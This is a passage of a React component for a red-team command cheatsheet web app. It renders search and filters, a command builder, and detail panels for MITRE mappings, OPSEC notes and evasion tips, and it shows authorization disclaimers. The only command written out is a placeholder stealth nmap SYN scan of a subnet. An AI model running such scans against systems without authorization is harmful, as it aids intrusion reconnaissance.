                            onClick={() => downloadAsProfessional('json')}
                            className="block px-4 py-2 text-sm text-zinc-300 hover:bg-zinc-700 w-full text-left"
                          >
                            JSON Format (.json)
                          </button>
                          <button
                            onClick={() => downloadAsProfessional('csv')}
                            className="block px-4 py-2 text-sm text-zinc-300 hover:bg-zinc-700 w-full text-left"
                          >
                            CSV Format (.csv)
                          </button>
                          <button
                            onClick={() => downloadAsProfessional('yaml')}
                            className="block px-4 py-2 text-sm text-zinc-300 hover:bg-zinc-700 w-full text-left"
                          >
                            YAML Format (.yaml)
                          </button>
                          <button
                            onClick={() => downloadAsProfessional('markdown')}
                            className="block px-4 py-2 text-sm text-zinc-300 hover:bg-zinc-700 w-full text-left"
                          >
                            Markdown (.md)
                          </button>
                        </div>
                      </div>
                    </div>
                    
                    {advancedMode && (
                      <button
                        onClick={() => setShowCustomBuilder(!showCustomBuilder)}
                        className="px-3 py-1 bg-purple-700/30 hover:bg-purple-700/50 border border-purple-600/30 rounded-md text-sm flex items-center gap-2"
                      >
                        <Code size={14} />
                        {showCustomBuilder ? 'Hide Builder' : 'Custom Commands'}
                      </button>
                    )}
                    
                    <button
                      onClick={resetCommandGenerator}
                      className="px-3 py-1 bg-zinc-800 hover:bg-zinc-700 rounded-md text-sm"
                    >
                      Start Over
                    </button>
                  </div>
                </div>
                
                {/* Custom Command Builder */}
                {showCustomBuilder && (
                  <div className="mb-6 p-4 bg-zinc-950/70 border border-zinc-800 rounded-lg">
                    <h4 className="text-purple-400 font-medium mb-3 flex items-center gap-2">
                      <Code size={16} />
                      Custom Command Builder
                    </h4>
                    
                    <div className="space-y-3 mb-4">
                      <div>
                        <label className="block text-xs text-zinc-400 mb-1">Command Title</label>
                        <input
                          type="text"
                          value={currentCustomCommand.title}
                          onChange={(e) => setCurrentCustomCommand(prev => ({...prev, title: e.target.value}))}
                          placeholder="e.g., Custom Port Scan"
                          className="w-full p-2 bg-zinc-800 border border-zinc-700 rounded-md text-sm"
                        />
                      </div>
                      
                      <div>
                        <label className="block text-xs text-zinc-400 mb-1">Description</label>
                        <input
                          type="text"
                          value={currentCustomCommand.description}
                          onChange={(e) => setCurrentCustomCommand(prev => ({...prev, description: e.target.value}))}
                          placeholder="e.g., Scan specific ports with custom options"
                          className="w-full p-2 bg-zinc-800 border border-zinc-700 rounded-md text-sm"
                        />
                      </div>
                      
                      <div>
                        <label className="block text-xs text-zinc-400 mb-1">Command</label>
                        <textarea
                          value={currentCustomCommand.command}
                          onChange={(e) => setCurrentCustomCommand(prev => ({...prev, command: e.target.value}))}
                          placeholder="e.g., nmap -sS -p 22,80,443,3389 -T2 192.168.1.0/24"
                          className="w-full p-2 bg-zinc-800 border border-zinc-700 rounded-md text-sm font-mono min-h-[80px]"
                        />
                      </div>
                      
                      <div>
                        <label className="block text-xs text-zinc-400 mb-1">Notes (optional)</label>
                        <input
                          type="text"
                          value={currentCustomCommand.notes || ''}
                          onChange={(e) => setCurrentCustomCommand(prev => ({...prev, notes: e.target.value}))}
                          placeholder="e.g., Use when targeting specific services with stealth"
                          className="w-full p-2 bg-zinc-800 border border-zinc-700 rounded-md text-sm"
                        />
                      </div>
                      
                      <div className="flex justify-end">
                        <button
                          onClick={addCustomCommand}
                          disabled={!currentCustomCommand.title || !currentCustomCommand.command}
                          className={`px-3 py-1 rounded-md text-sm flex items-center gap-2 ${
                            !currentCustomCommand.title || !currentCustomCommand.command
                              ? 'bg-zinc-800 text-zinc-500 cursor-not-allowed'
                              : 'bg-green-700/30 hover:bg-green-700/50 border border-green-600/30 text-green-400'
                          }`}
                        >
                          <Plus size={14} />
                          Add Command
                        </button>
                      </div>
                    </div>
                    
                    {customCommands.length > 0 && (
                      <>
                        <div className="mb-2 border-t border-zinc-800 pt-3">
                          <h5 className="text-sm font-medium text-zinc-300 mb-2">Your Custom Commands:</h5>
                          <div className="space-y-2">
                            {customCommands.map((cmd, index) => (
                              <div key={index} className="flex items-center justify-between p-2 bg-zinc-900 rounded-md text-sm">
                                <div>
                                  <div className="font-medium">{cmd.title}</div>
                                  <div className="text-xs text-zinc-500 font-mono truncate max-w-[300px]">{cmd.command}</div>
                                </div>
                                <button
                                  onClick={() => removeCustomCommand(index)}
                                  className="p-1 hover:bg-zinc-800 rounded text-zinc-500 hover:text-red-400"
                                  title="Remove command"
                                >
                                  <Trash2 size={14} />
                                </button>
                              </div>
                            ))}
                          </div>
                          
                          <button
                            onClick={addCustomCommandsToGenerated}
                            className="mt-3 px-3 py-1 bg-purple-700/30 hover:bg-purple-700/50 border border-purple-600/30 rounded-md text-sm w-full"
                          >
                            Add Custom Commands to Workflow
                          </button>
                        </div>
                      </>
                    )}
                  </div>
                )}
                
                <p className="mb-4 text-zinc-400 text-sm border-l-2 border-yellow-500 pl-3">
                  These commands are generated based on your inputs and should be executed in sequence. Always ensure you have proper authorization before testing.
                </p>
                
                <div className="space-y-4">
                  {generatedCommands.map((cmd, index) => (
                    <div 
                      key={index}
                      className="p-4 bg-zinc-900 border border-zinc-800 rounded-lg"
                    >
                      <div className="flex items-center justify-between mb-2">
                        <div className="flex items-center gap-2">
                          <div className="w-6 h-6 rounded-full bg-blue-600/20 flex items-center justify-center text-blue-400 text-sm font-bold">
                            {index + 1}
                          </div>
                          <h4 className="font-semibold">{cmd.title}</h4>
                        </div>
                        <button
                          onClick={() => copyToClipboard(cmd.command)}
                          className="p-1 rounded hover:bg-zinc-800 text-zinc-400 hover:text-zinc-200"
                          title="Copy command"
                        >
                          <Copy className="h-4 w-4" />
                        </button>
                      </div>
                      
                      <p className="text-sm text-zinc-400 mb-2">{cmd.description}</p>
                      
                      {cmd.mitreId && advancedMode && (
                        <div className="mb-2 flex items-center gap-2">
                          <span className="bg-red-800/30 text-red-400 text-xs px-2 py-0.5 rounded-md border border-red-800/50">
                            MITRE {cmd.mitreId}
                          </span>
                          <span className="text-xs text-zinc-500">{cmd.mitreTechnique}</span>
                        </div>
                      )}
                      
                      <div className="bg-zinc-950 p-3 rounded font-mono text-sm text-zinc-300 overflow-x-auto">
                        {cmd.command}
                      </div>
                      
                      {cmd.notes && (
                        <div className="mt-2 text-xs text-yellow-500/80 flex items-start gap-1">
                          <HelpCircle className="h-3 w-3 mt-0.5 flex-shrink-0" />
                          <span>{cmd.notes}</span>
                        </div>
                      )}
                    </div>
                  ))}
                </div>
              </div>
            )}
            </LiquidGlass>
          </motion.div>
        )}
        
        {/* Beginner Helper */}
        {showHelperInfo && (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.5, delay: 0.1 }}
            className="mb-8 p-4 bg-blue-900/20 border border-blue-700/30 rounded-lg"
          >
            <div className="flex items-start gap-4">
              <div className="bg-blue-500/20 p-3 rounded-full">
                <Terminal className="w-6 h-6 text-blue-400" />
              </div>
              <div>
                <h3 className="text-xl font-semibold text-blue-400 mb-2">How to use this cheatsheet</h3>
                <ol className="list-decimal pl-5 text-zinc-300 space-y-2">
                  <li><span className="font-medium text-white">Select a category</span> from the options below to see available techniques</li>
                  <li><span className="font-medium text-white">Choose a specific area</span> to see the relevant commands</li>
                  <li><span className="font-medium text-white">Copy commands</span> by clicking the copy icon next to each command</li>
                  <li><span className="font-medium text-white">Search</span> for specific commands using the search bar</li>
                  <li><span className="font-medium text-white">Use the Command Generator</span> for step-by-step guidance based on your scenario</li>
                </ol>
                <p className="text-zinc-400 mt-3 text-sm">
                  <strong className="text-yellow-400">Note:</strong> All techniques should only be used on systems you own or have permission to test. Always ensure proper authorization.
                </p>
              </div>
            </div>
            
            {activeHelp && (
              <motion.div
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                transition={{ duration: 0.5 }}
                className="mt-4 p-3 bg-zinc-900/70 border border-zinc-800 rounded-lg"
              >
                <h4 className="text-blue-400 font-medium mb-1">{selectedCategory} Techniques</h4>
                <p className="text-zinc-300 text-sm">
                  {helpTips[activeHelp as keyof typeof helpTips] || 
                   `Select a specific technique area to see available commands.`}
                </p>
              </motion.div>
            )}
          </motion.div>
        )}
        
        {/* Search Bar */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5, delay: 0.1 }}
          className="max-w-4xl mx-auto mb-8"
        >
          <div className="relative mb-4">
            <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
              <Search className="h-5 w-5 text-zinc-500" />
            </div>
            <input
              type="text"
              placeholder="Search commands, tools, or techniques..."
              className="block w-full bg-zinc-900/70 backdrop-blur-sm border border-zinc-800 rounded-lg py-3 pl-10 pr-12 placeholder-zinc-500 focus:outline-none focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500/50"
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
            />
            <button
              onClick={() => setShowAdvancedFilters(!showAdvancedFilters)}
              className="absolute inset-y-0 right-0 pr-3 flex items-center text-zinc-500 hover:text-zinc-300 transition-colors"
            >
              <Filter className="h-5 w-5" />
            </button>
          </div>
          
          {/* Advanced Filters */}
          {showAdvancedFilters && (
            <motion.div
              initial={{ opacity: 0, height: 0 }}
              animate={{ opacity: 1, height: 'auto' }}
              exit={{ opacity: 0, height: 0 }}
              className="bg-zinc-900/70 backdrop-blur-sm border border-zinc-800 rounded-lg p-4 mb-4"
            >
              <div className="flex items-center gap-2 mb-3">
                <Filter className="h-4 w-4 text-blue-400" />
                <h3 className="text-sm font-semibold text-blue-400">Advanced Filters</h3>
              </div>
              
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                {/* Risk Level Filter */}
                <div>
                  <label className="block text-xs text-zinc-400 mb-2">Risk Level</label>
                  <select
                    value={filterRiskLevel}
                    onChange={(e) => setFilterRiskLevel(e.target.value)}
                    className="w-full bg-zinc-800 border border-zinc-700 rounded-md py-2 px-3 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500/50"
                  >
                    <option value="">All Risk Levels</option>
                    <option value="Low">🟢 Low</option>
                    <option value="Medium">🟡 Medium</option>
                    <option value="High">🟠 High</option>
                    <option value="Critical">🔴 Critical</option>
                  </select>
                </div>
                
                {/* Platform Filter */}
                <div>
                  <label className="block text-xs text-zinc-400 mb-2">Platform</label>
                  <select
                    value={filterPlatform}
                    onChange={(e) => setFilterPlatform(e.target.value)}
                    className="w-full bg-zinc-800 border border-zinc-700 rounded-md py-2 px-3 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500/50"
                  >
                    <option value="">All Platforms</option>
                    <option value="Linux">🐧 Linux</option>
                    <option value="Windows">🪟 Windows</option>
                    <option value="macOS">🍎 macOS</option>
                  </select>
                </div>
                
                {/* MITRE ATT&CK Filter */}
                <div>
                  <label className="block text-xs text-zinc-400 mb-2">MITRE ATT&CK</label>
                  <div className="flex items-center">
                    <input
                      type="checkbox"
                      id="mitre-filter"
                      checked={filterMitre}
                      onChange={(e) => setFilterMitre(e.target.checked)}
                      className="mr-2 rounded border-zinc-700 bg-zinc-800 text-blue-600 focus:ring-blue-500/50"
                    />
                    <label htmlFor="mitre-filter" className="text-sm text-zinc-300">
                      🎯 Only show commands with MITRE mappings
                    </label>
                  </div>
                </div>
              </div>
              
              {/* Filter Summary */}
              {(filterRiskLevel || filterPlatform || filterMitre) && (
                <div className="mt-4 pt-3 border-t border-zinc-800">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-2 text-xs text-zinc-400">
                      <span>Active filters:</span>
                      {filterRiskLevel && (
                        <span className="px-2 py-1 bg-zinc-800 rounded-md">{filterRiskLevel} Risk</span>
                      )}
                      {filterPlatform && (
                        <span className="px-2 py-1 bg-zinc-800 rounded-md">{filterPlatform}</span>
                      )}
                      {filterMitre && (
                        <span className="px-2 py-1 bg-zinc-800 rounded-md">MITRE Mapped</span>
                      )}
                    </div>
                    <button
                      onClick={() => {
                        setFilterRiskLevel('');
                        setFilterPlatform('');
                        setFilterMitre(false);
                      }}
                      className="text-xs text-zinc-500 hover:text-zinc-300 underline"
                    >
                      Clear all filters
                    </button>
                  </div>
                </div>
              )}
            </motion.div>
          )}
        </motion.div>

        {/* Results Summary */}
        {(searchTerm || filterRiskLevel || filterPlatform || filterMitre) && (
          <motion.div
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            className="mb-6 text-center"
          >
            <div className="inline-flex items-center gap-2 px-4 py-2 bg-zinc-900/70 border border-zinc-800 rounded-lg text-sm">
              <Search className="w-4 h-4 text-zinc-400" />
              <span className="text-zinc-300">
                Found {filteredCategories.reduce((total, cat) => 
                  total + cat.subcategories.reduce((subTotal, sub) => subTotal + sub.commands.length, 0), 0
                )} commands
              </span>
              {(filterRiskLevel || filterPlatform || filterMitre) && (
                <span className="text-zinc-500">with active filters</span>
              )}
            </div>
          </motion.div>
        )}

        {/* Categories */}
        <motion.div
          ref={categoriesRef}
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ duration: 0.5, delay: 0.2 }}
          className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4 mb-8"
        >
          {cheatsheetData.map((category, index) => (
            <motion.div
              key={category.name}
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              transition={{ duration: 0.3, delay: 0.1 + index * 0.05 }}
              className={`cursor-pointer rounded-lg border backdrop-blur-sm p-4 transition-all duration-300 hover:shadow-lg ${
                selectedCategory === category.name
                  ? isLoadingCategory 
                    ? 'bg-blue-900/30 border-blue-600/60 animate-pulse'
                    : 'bg-blue-900/20 border-blue-700/50'
                  : 'bg-zinc-900/70 border-zinc-800/50 hover:bg-zinc-800/50'
              }`}
              onClick={() => handleCategoryClick(category.name)}
            >
              <div className="flex items-center gap-3">
                <div className={`p-2 rounded-lg relative ${
                  selectedCategory === category.name
                    ? 'bg-blue-900/50 text-blue-400'
                    : 'bg-zinc-800/80 text-zinc-400'
                }`}>
                  {selectedCategory === category.name && isLoadingCategory ? (
                    <div className="w-5 h-5 border-2 border-blue-400/30 border-t-blue-400 rounded-full animate-spin"></div>
                  ) : (
                    category.icon
                  )}
                </div>
                <div>
                  <h3 className="font-semibold text-lg">{category.name}</h3>
                  <p className="text-sm text-zinc-400">{category.description}</p>
                  <div className="flex items-center gap-1 mt-1">
                    <div className="h-1.5 w-1.5 rounded-full bg-green-500"></div>
                    <span className="text-xs text-zinc-500">{category.subcategories.reduce((total, subcat) => total + subcat.commands.length, 0)} commands</span>
                  </div>
                </div>
              </div>
            </motion.div>
          ))}
        </motion.div>

        {/* Selection breadcrumb */}
        {selectedCategory && !searchTerm && (
          <motion.div
            initial={{ opacity: 0, y: -10 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.4 }}
            className="mt-6 mb-4"
          >
            <div className="flex items-center justify-center gap-2 text-sm">
              <div className="flex items-center gap-2 px-4 py-2 bg-blue-900/20 border border-blue-700/30 rounded-full">
                <span className="text-zinc-400">Selected:</span>
                <span className="text-blue-400 font-medium">{selectedCategory}</span>
                {selectedSubcategory && (
                  <>
                    <ChevronRight className="h-3 w-3 text-zinc-500" />
                    <span className="text-blue-300">{selectedSubcategory}</span>
                  </>
                )}
              </div>
            </div>
            
            {/* Animated scroll indicator */}
            {!isLoadingCategory && (
              <motion.div
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                transition={{ duration: 0.6, delay: 0.3 }}
                className="flex flex-col items-center mt-4"
              >
                <motion.div
                  animate={{ y: [0, 8, 0] }}
                  transition={{ duration: 1.5, repeat: Infinity, ease: "easeInOut" }}
                  className="text-blue-400/60"
                >
                  <ChevronDown className="h-5 w-5" />
                </motion.div>
                <span className="text-xs text-zinc-500 mt-1">Scroll down to see techniques</span>
              </motion.div>
            )}
          </motion.div>
        )}

        {/* Main Content Area */}
        <div ref={resultsRef} className="mt-8">
          {searchTerm || selectedCategory ? (
            <div className="flex flex-col lg:flex-row gap-6">
              {/* Display subcategories when a category is selected */}
              {selectedCategory && !searchTerm && (
                <motion.div 
                  initial={{ opacity: 0, x: -20 }}
                  animate={{ opacity: 1, x: 0 }}
                  transition={{ duration: 0.4 }}
                  className="lg:w-1/4"
                >
                  <h2 className="text-xl font-bold mb-4 flex items-center gap-2">
                    {cheatsheetData.find(c => c.name === selectedCategory)?.icon}
                    <span>{selectedCategory}</span>
                  </h2>
                  <div className="space-y-2">
                    {cheatsheetData
                      .find(c => c.name === selectedCategory)
                      ?.subcategories.map((subcat, idx) => (
                        <motion.div
                          key={subcat.name}
                          initial={{ opacity: 0, y: 10 }}
                          animate={{ opacity: 1, y: 0 }}
                          transition={{ duration: 0.3, delay: 0.05 * idx }}
                          className={`p-3 rounded-lg cursor-pointer transition-colors ${
                            selectedSubcategory === subcat.name
                              ? 'bg-blue-900/30 border border-blue-700/50'
                              : 'bg-zinc-900/70 border border-zinc-800/50 hover:bg-zinc-800/50'
                          }`}
                          onClick={() => handleSubcategoryClick(subcat.name)}
                        >
                          <h3 className="font-semibold">{subcat.name}</h3>
                          <p className="text-sm text-zinc-400">{subcat.description}</p>
                          <div className="flex items-center gap-1 mt-1">
                            <div className="h-1.5 w-1.5 rounded-full bg-blue-500"></div>
                            <span className="text-xs text-zinc-500">{subcat.commands.length} commands</span>
                          </div>
                        </motion.div>
                      ))}
                  </div>
                </motion.div>
              )}
              
              {/* Commands list */}
              <motion.div 
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                transition={{ duration: 0.4, delay: 0.2 }}
                className={`${selectedCategory && !searchTerm ? 'lg:w-3/4' : 'w-full'}`}
              >
                {/* When searching, show all matching categories/subcategories */}
                {searchTerm && (
                  filteredCategories.map((category, categoryIndex) => (
                    <motion.div
                      key={category.name}
                      initial={{ opacity: 0, y: 20 }}
                      animate={{ opacity: 1, y: 0 }}
                      transition={{ duration: 0.4, delay: 0.1 + categoryIndex * 0.05 }}
                      className="mb-8"
                    >
                      <h2 className="text-xl font-bold mb-4 flex items-center gap-2">
                        {category.icon}
                        <span>{category.name}</span>
                      </h2>
                      
                      {category.subcategories.map((subcategory, subcatIdx) => (
                        <div key={subcategory.name} className="mb-6">
                          <h3 className="text-lg font-semibold mb-3 text-blue-400">{subcategory.name}</h3>
                          <div className="space-y-3">
                            {renderCommands(subcategory.commands, `${category.name}-${subcategory.name}`)}
                          </div>
                        </div>
                      ))}
                    </motion.div>
                  ))
                )}
                
                {/* Loading indicator for category */}
                {selectedCategory && !searchTerm && isLoadingCategory && (
                  <motion.div
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    transition={{ duration: 0.3 }}
                    className="flex items-center justify-center py-12"
                  >
                    <div className="text-center">
                      <div className="w-8 h-8 border-2 border-blue-400/30 border-t-blue-400 rounded-full animate-spin mx-auto mb-4"></div>
                      <p className="text-blue-400 font-medium">Loading {selectedCategory} techniques...</p>
                      <p className="text-zinc-400 text-sm mt-1">Preparing command arsenal</p>
                    </div>
                  </motion.div>
                )}
                
                {/* When a category is selected without search, show that category */}
                {selectedCategory && !searchTerm && !isLoadingCategory && (
                  <div>
                    {/* When no subcategory is selected, show brief description of all subcategories */}
                    {!selectedSubcategory && (
                      <div>
                        <h2 className="text-xl font-bold mb-6">Select a technique area</h2>
                        <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
                          {cheatsheetData
                            .find(c => c.name === selectedCategory)
                            ?.subcategories.map((subcat, idx) => (
                              <motion.div
                                key={subcat.name}
                                initial={{ opacity: 0, scale: 0.95 }}
                                animate={{ opacity: 1, scale: 1 }}
                                transition={{ duration: 0.3, delay: 0.05 * idx }}
                                className="p-4 rounded-lg bg-zinc-900/70 border border-zinc-800/50 hover:bg-zinc-800/50 cursor-pointer"
                                onClick={() => handleSubcategoryClick(subcat.name)}
                              >
                                <h3 className="font-semibold text-blue-400">{subcat.name}</h3>
                                <p className="text-sm text-zinc-400 mt-1">{subcat.description}</p>
                                <p className="text-xs text-zinc-500 mt-2">
                                  {subcat.commands.length} {subcat.commands.length === 1 ? 'command' : 'commands'} available
                                </p>
                              </motion.div>
                            ))}
                        </div>
                      </div>
                    )}
                    
                    {/* When a subcategory is selected, show all its commands */}
                    {selectedSubcategory && (
                      <div>
                        <div className="flex items-center justify-between mb-6">
                          <h2 className="text-xl font-bold flex items-center gap-2">
                            <span className="text-blue-400">{selectedSubcategory}</span>
                          </h2>
                          <button
                            onClick={() => setSelectedSubcategory(null)}
                            className="text-xs px-3 py-1 rounded-md bg-zinc-800 hover:bg-zinc-700 text-zinc-300 transition-colors"
                          >
                            Back to all techniques
                          </button>
                        </div>
                        
                        {/* Subcategory description card */}
                        <div className="mb-6 p-4 bg-zinc-900/70 border border-zinc-800/50 rounded-lg">
                          <p className="text-zinc-300">
                            {cheatsheetData
                              .find(c => c.name === selectedCategory)
                              ?.subcategories.find(s => s.name === selectedSubcategory)
                              ?.description}
                          </p>
                          <div className="flex mt-3 gap-1 items-center">
                            <div className="h-2 w-2 rounded-full bg-yellow-500"></div>
                            <p className="text-xs text-zinc-400">
                              Click on any command to see more details and copy it to your clipboard
                            </p>
                          </div>
                        </div>
                        
                        <div className="space-y-3 commands-section">
                          {renderCommands(
                            cheatsheetData
                              .find(c => c.name === selectedCategory)
                              ?.subcategories.find(s => s.name === selectedSubcategory)
                              ?.commands || [],
                            `${selectedCategory}-${selectedSubcategory}`
                          )}
                        </div>
                      </div>
                    )}
                  </div>
                )}
                
                {/* When nothing is selected or found */}
                {!searchTerm && !selectedCategory && (
                  <motion.div
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    transition={{ duration: 0.4 }}
                    className="text-center text-zinc-400 my-12"
                  >
                    <p>Select a category or search for commands</p>
                  </motion.div>
                )}
                
                {searchTerm && filteredCategories.length === 0 && (
                  <motion.div
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    transition={{ duration: 0.4 }}
                    className="text-center text-zinc-400 my-12"
                  >
                    <p>No commands found matching your search</p>
                  </motion.div>
                )}
              </motion.div>
            </div>
          ) : (
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ duration: 0.4 }}
              className="text-center text-zinc-400 my-12"
            >
              <p>Select a category or search for commands</p>
            </motion.div>
          )}
        </div>

        {/* Scroll to top button */}
        {selectedCategory && !isLoadingCategory && (
          <motion.button
            initial={{ opacity: 0, scale: 0.8 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 0.8 }}
            transition={{ duration: 0.3 }}
            onClick={() => {
              if (categoriesRef.current) {
                categoriesRef.current.scrollIntoView({ 
                  behavior: 'smooth', 
                  block: 'start',
                  inline: 'nearest'
                });
              }
            }}
            className="fixed bottom-6 right-6 p-3 bg-blue-600 hover:bg-blue-700 text-white rounded-full shadow-lg transition-colors z-40 flex items-center gap-2"
            title="Back to categories"
          >
            <ChevronRight className="h-4 w-4 rotate-[-90deg]" />
            <span className="hidden sm:inline text-sm">Back to Categories</span>
          </motion.button>
        )}

        {/* Notification for copied command */}
        {copiedCommand && (
          <div className="fixed bottom-4 left-1/2 transform -translate-x-1/2 bg-zinc-800 text-white px-4 py-2 rounded-md shadow-lg z-50 flex items-center gap-2">
            <Copy className="h-4 w-4 text-green-400" />
            <span>Command copied to clipboard</span>
          </div>
        )}

        {/* Footer */}
        <div className="mt-10 pt-6 border-t border-zinc-800/50 text-center text-zinc-500 text-sm">
          <p>Professional Red Team Command Reference</p>
          <p className="mt-1 text-zinc-600">
            Comprehensive collection of penetration testing and red team techniques
          </p>
        </div>
      </div>
    </div>
  );

  // Helper function to render commands
  function renderCommands(commands: Command[], baseId: string) {
    return commands.map((cmd, cmdIndex) => {
      const commandId = `${baseId}-${cmdIndex}`;
      const isExpanded = expandedCommands[commandId];
      
      return (
        <motion.div
          key={commandId}
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.3, delay: 0.1 + cmdIndex * 0.03 }}
          className="bg-zinc-900/70 backdrop-blur-sm border border-zinc-800 rounded-lg overflow-hidden"
        >
          <div 
            className="p-3 cursor-pointer flex justify-between items-start"
            onClick={() => toggleCommandExpanded(commandId)}
          >
            <div className="flex-1">
              <div className="flex items-center gap-2">
                <div className="text-zinc-300 font-mono text-sm bg-zinc-800/70 px-2 py-1 rounded flex-1 overflow-x-auto">
                  {cmd.command}
                </div>
                <button
                  onClick={(e) => {
                    e.stopPropagation();
                    copyToClipboard(cmd.command);
                  }}
                  className="p-1 rounded hover:bg-zinc-800 text-zinc-400 hover:text-zinc-200"
                  title="Copy command"
                >
                  <Copy className="h-4 w-4" />
                </button>
              </div>
              <p className="text-sm text-zinc-400 mt-1">{cmd.description}</p>
              
              {/* Show indicators for available metadata */}
              {!isExpanded && (
                <div className="flex items-center gap-3 mt-2 flex-wrap">
                  {cmd.example && (
                    <div className="flex items-center gap-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-green-500"></div>
                      <span className="text-xs text-green-500/80">Example</span>
                    </div>
                  )}
                  {cmd.mitreTechnique && (
                    <div className="flex items-center gap-1">
                      <div className="h-1.5 w-1.5 rounded-full bg-red-500"></div>
                      <span className="text-xs text-red-500/80">MITRE ATT&CK</span>
                    </div>
                  )}
                  {cmd.opsecNotes && (
                    <div className="flex items-center gap-1">
                      <div className="h-1.5 w-1.5 rounded-full bg-yellow-500"></div>
                      <span className="text-xs text-yellow-500/80">OPSEC</span>
                    </div>
                  )}
                  {cmd.evasionTips && (
                    <div className="flex items-center gap-1">
                      <div className="h-1.5 w-1.5 rounded-full bg-cyan-500"></div>
                      <span className="text-xs text-cyan-500/80">Evasion</span>
                    </div>
                  )}
                  {cmd.riskLevel && (
                    <div className="flex items-center gap-1">
                      <div className={`h-1.5 w-1.5 rounded-full ${
                        cmd.riskLevel === 'Critical' ? 'bg-red-500' :
                        cmd.riskLevel === 'High' ? 'bg-orange-500' :
                        cmd.riskLevel === 'Medium' ? 'bg-yellow-500' :
                        'bg-green-500'
                      }`}></div>
                      <span className={`text-xs ${
                        cmd.riskLevel === 'Critical' ? 'text-red-500/80' :
                        cmd.riskLevel === 'High' ? 'text-orange-500/80' :
                        cmd.riskLevel === 'Medium' ? 'text-yellow-500/80' :
                        'text-green-500/80'
                      }`}>{cmd.riskLevel} Risk</span>
                    </div>
                  )}
                </div>
              )}
            </div>
            <div className="ml-2 text-zinc-500">
              {isExpanded ? <ChevronDown className="h-5 w-5" /> : <ChevronRight className="h-5 w-5" />}
            </div>
          </div>
          
          {isExpanded && (
            <div className="px-3 pb-3 pt-1 space-y-3">
              {/* Example */}
              {cmd.example && (
              <div className="text-sm">
                <div className="text-green-500 mb-1 flex items-center gap-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-green-500"></div>
                  <span>Example:</span>
                </div>
                <div className="font-mono bg-zinc-950/70 p-2 rounded-md text-zinc-300 overflow-x-auto flex justify-between gap-2">
                  <code>{cmd.example}</code>
                  <button
                    onClick={() => copyToClipboard(cmd.example || '')}
                    className="p-1 rounded hover:bg-zinc-800 text-zinc-400 hover:text-zinc-200 flex-shrink-0"
                    title="Copy example"
                  >
                    <Copy className="h-3 w-3" />
                  </button>
                </div>
              </div>
              )}

              {/* Metadata Grid */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-3 text-sm">
                {/* MITRE ATT&CK */}
                {cmd.mitreTechnique && (
                  <div className="bg-red-500/10 border border-red-500/20 rounded-md p-2">
                    <div className="flex items-center gap-1 mb-1">
                      <Target className="h-3 w-3 text-red-400" />
                      <span className="text-red-400 font-medium">MITRE ATT&CK</span>
                    </div>
                    <div className="text-zinc-300 text-xs">
                      {cmd.mitreTechnique} {cmd.mitreId && `(${cmd.mitreId})`}
                    </div>
                  </div>
                )}

                {/* Risk Level */}
                {cmd.riskLevel && (
                  <div className={`border rounded-md p-2 ${
                    cmd.riskLevel === 'Critical' ? 'bg-red-500/10 border-red-500/20' :
                    cmd.riskLevel === 'High' ? 'bg-orange-500/10 border-orange-500/20' :
                    cmd.riskLevel === 'Medium' ? 'bg-yellow-500/10 border-yellow-500/20' :
                    'bg-green-500/10 border-green-500/20'
                  }`}>
                    <div className="flex items-center gap-1 mb-1">
                      <AlertTriangle className={`h-3 w-3 ${
                        cmd.riskLevel === 'Critical' ? 'text-red-400' :
                        cmd.riskLevel === 'High' ? 'text-orange-400' :
                        cmd.riskLevel === 'Medium' ? 'text-yellow-400' :
                        'text-green-400'
                      }`} />
                      <span className={`font-medium ${
                        cmd.riskLevel === 'Critical' ? 'text-red-400' :
                        cmd.riskLevel === 'High' ? 'text-orange-400' :
                        cmd.riskLevel === 'Medium' ? 'text-yellow-400' :
                        'text-green-400'
                      }`}>Risk Level</span>
                    </div>
                    <div className="text-zinc-300 text-xs">{cmd.riskLevel}</div>
                  </div>
                )}

                {/* Platform Support */}
                {cmd.platform && cmd.platform.length > 0 && (
                  <div className="bg-blue-500/10 border border-blue-500/20 rounded-md p-2">
                    <div className="flex items-center gap-1 mb-1">
                      <Cpu className="h-3 w-3 text-blue-400" />
                      <span className="text-blue-400 font-medium">Platform</span>
                    </div>
                    <div className="flex flex-wrap gap-1">
                      {cmd.platform.map((platform, idx) => (
                        <span key={idx} className="text-xs bg-blue-500/20 text-blue-300 px-1 py-0.5 rounded">
                          {platform}
                        </span>
                      ))}
                    </div>
                  </div>
                )}

                {/* Prerequisites */}
                {cmd.prerequisites && (
                  <div className="bg-purple-500/10 border border-purple-500/20 rounded-md p-2">
                    <div className="flex items-center gap-1 mb-1">
                      <Key className="h-3 w-3 text-purple-400" />
                      <span className="text-purple-400 font-medium">Prerequisites</span>
                    </div>
                    <div className="text-zinc-300 text-xs">{cmd.prerequisites}</div>
                  </div>
